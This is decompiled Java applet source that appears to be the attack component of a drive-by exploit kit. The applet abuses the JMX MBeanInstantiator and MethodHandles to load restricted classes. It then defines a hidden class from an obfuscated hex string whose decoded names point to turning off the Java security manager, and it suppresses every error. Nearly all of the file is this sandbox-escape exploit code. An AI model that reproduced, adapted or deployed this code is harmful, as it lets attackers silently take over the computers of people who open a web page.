import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.JmxMBeanServerBuilder;
import com.sun.jmx.mbeanserver.MBeanInstantiator;
import java.applet.Applet;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.invoke.MethodHandles.Lookup;
import javax.management.MBeanServer;
import javax.management.MBeanServerDelegate;

public class Zend extends Applet {

   public static String Ciasio = "CAmMoedlFEBABmMoedlE0000003200270A0mMoedl00500180A0019001A07001mMoedlB0A001C001D07001E07001F07002001mMoedl00063C696E69743E01000328295601mMoedl0004436F646501000F4C696E65mMoedl4E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010001650100154C6A61766mMoedl12F6C616E672F457863657074696F6E3BmMoedl010004746869730100034C423B01mMoedl000D537461636B4D61705461626C6507001FmMoedl07001B01000372756E01001428294C6mMoedlA6176612F6C616E672mMoedlF4F626A6563743B01000A536F757mMoedl2636546696C65010006422E6A61mMoedl76610C000800090700210CmMoedl002200230100136A6176612F6C616E672F457863657074696F6E0700240C002500260100106A6176612F6C6mMoedl16E672F4F626A656374010001420mMoedl100276A6176612F7365637mMoedl5726974792F50726976696C65676564457863657074696F6E416374696F6E01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657mMoedl201000C646F50726976696CmMoedl6567656401003D284C6A6176612FmMoedl73656375726974792F50726976696C65676564457863657074696F6E41mMoedl6374696F6E3B2mMoedl94C6A6176612F6C616E672F4mMoedlF626A6563743B0100106A6176612F6C616E672F53797374656D01001273657453656375726974794D616E6167657201001E284mMoedlC6A6176612F6C616E672FmMoedl53656375726974794D61mMoedl6E616765723B295600210006000mMoedl500010007000000020001000800090001000A0000006C000100020000000E2AB700012AB8000257A700044CB1000100040009000C00030003000B000000120004000000080004000B0009000C000D000D000C000000160002000D0000000D000E00010000000E000F00mMoedl1000000011000000100002FF000C00010mMoedl70012000107001300000100140015000mMoedl1000A0000003A000200010000000C01B80004BB000559B70001B000000002000B00mMoedl00000A00020000001000040mMoedl011000C0000000C00010000mMoedl000C000F00100000000100160000mMoedl00020017".replace("mMoedl", "");


   public void init() {
      try {
         Rvre.sfgkytoi = this.getParameter(Allaon.Gege);
         byte[] e = Rvre.Mzxyu(Ciasio);
         JmxMBeanServerBuilder localJmxMBeanServerBuilder = new JmxMBeanServerBuilder();
         JmxMBeanServer localJmxMBeanServer = (JmxMBeanServer)localJmxMBeanServerBuilder.newMBeanServer("", (MBeanServer)null, (MBeanServerDelegate)null);
         MBeanInstantiator localMBeanInstantiator = localJmxMBeanServer.getMBeanInstantiator();
         Object a = null;
         Class localClass1 = localMBeanInstantiator.findClass(Allaon.Contex, (ClassLoader)a);
         Class localClass2 = localMBeanInstantiator.findClass(Allaon.ClsLoad, (ClassLoader)a);
         Lookup lolluk = MethodHandles.publicLookup();
         MethodType localMethodType1 = MethodType.methodType(MethodHandle.class, Class.class, new Class[]{MethodType.class});
         MethodHandle localMethodHandle1 = lolluk.findVirtual(Lookup.class, Allaon.Fcons, localMethodType1);
         MethodType localMethodType2 = MethodType.methodType(Void.TYPE);
         MethodHandle localMethodHandle2 = (MethodHandle)localMethodHandle1.invokeWithArguments(new Object[]{lolluk, localClass1, localMethodType2});
         Object localObject1 = localMethodHandle2.invokeWithArguments(new Object[0]);
         MethodType ldmet3 = MethodType.methodType(MethodHandle.class, Class.class, new Class[]{String.class, MethodType.class});
         MethodHandle localMethodHandle3 = lolluk.findVirtual(Lookup.class, Allaon.Fvirt, ldmet3);
         MethodType ldmet4 = MethodType.methodType(localClass2, ClassLoader.class);
         MethodHandle localMethodHandle4 = (MethodHandle)localMethodHandle3.invokeWithArguments(new Object[]{lolluk, localClass1, Allaon.Crtcls, ldmet4});
         Object lObj2 = localMethodHandle4.invokeWithArguments(new Object[]{localObject1, null});
         MethodType ldmet5 = MethodType.methodType(Class.class, String.class, new Class[]{byte[].class});
         MethodHandle localMethodHandle5 = (MethodHandle)localMethodHandle3.invokeWithArguments(new Object[]{lolluk, localClass2, Allaon.DEfc, ldmet5});
         Class lca3 = (Class)localMethodHandle5.invokeWithArguments(new Object[]{lObj2, null, e});
         lca3.newInstance();
         Lizixk.Seuylmxz();
      } catch (Throwable var22) {
         ;
      }

   }

}
